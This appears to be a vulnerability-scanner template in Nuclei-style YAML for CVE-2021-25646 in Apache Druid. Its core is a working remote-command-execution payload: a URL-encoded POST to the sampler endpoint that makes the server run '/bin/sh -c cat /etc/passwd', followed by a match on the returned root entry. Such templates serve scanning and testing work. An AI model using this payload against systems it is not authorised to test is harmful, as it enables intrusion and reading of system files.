id: yaml-poc-apache-druid-unauthorized_access-CVE-2021-25646
info:
  name: Yaml Poc Apache Druid Unauthorized_Access Cve 2021 25646
  author: converted
  severity: high
  description: 'Converted from xpoc: yaml-poc-apache-druid-unauthorized_access-CVE-2021-25646'
  tags: apache,unauth,cve
  classification:
    cve-id: CVE-2021-25646
  reference:
  - http://help.aliyun.com/noticelist/articleid/1060799717.html
  - http://packetstormsecurity.com/files/162345/Apache-Druid-0.20.0-Remote-Command-Execution.html
  - http://www.openwall.com/lists/oss-security/2021/01/29/6
  - https://cxsecurity.com/issue/WLB-2021040141
  - https://lists.apache.org/thread.html/r04fa1ba93599487c95a8497044d37f8c02a439bfcf92b4567bfb7c8f%40%3Ccommits.druid.apache.org%3E
http:
- method: POST
  path:
  - /druid/indexer/v1/sampler
  body: '%7B%22type%22%3A%22index%22%2C%22spec%22%3A%7B%22ioConfig%22%3A%7B%22type%22%3A%22index%22%2C%22firehose%22%3A%7B%22type%22%3A%22local%22%2C%22baseDir%22%3A%22/etc%22%2C%22filter%22%3A%22passwd%22%7D%7D%2C%22dataSchema%22%3A%7B%22dataSource%22%3A%22odgjxrrrePz%22%2C%22parser%22%3A%7B%22parseSpec%22%3A%7B%22format%22%3A%22javascript%22%2C%22timestampSpec%22%3A%7B%7D%2C%22dimensionsSpec%22%3A%7B%7D%2C%22function%22%3A%22function%28%29%7Bvar%20hTVCCerYZ%20%3D%20new%20java.util.Scanner%28java.lang.Runtime.getRuntime%28%29.exec%28%5C%22/bin/sh%60@%7E-c%60@%7Ecat%20/etc/passwd%5C%22.split%28%5C%22%60@%7E%5C%22%29%29.getInputStream%28%29%29.useDelimiter%28%5C%22%5C%5CA%5C%22%29.next%28%29%3Breturn%20%7Btimestamp%3A%5C%224137368%5C%22%2COQtGXcxBVQVL%3A%20hTVCCerYZ%7D%7D%22%2C%22%22%3A%7B%22enabled%22%3A%22true%22%7D%7D%7D%7D%7D%2C%22samplerConfig%22%3A%7B%22numRows%22%3A10%7D%7D'
  headers:
    Accept: application/json, text/plain, */*
    Content-Type: application/json
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: regex
    part: body
    regex:
    - 'root:[x*]:0:0:'
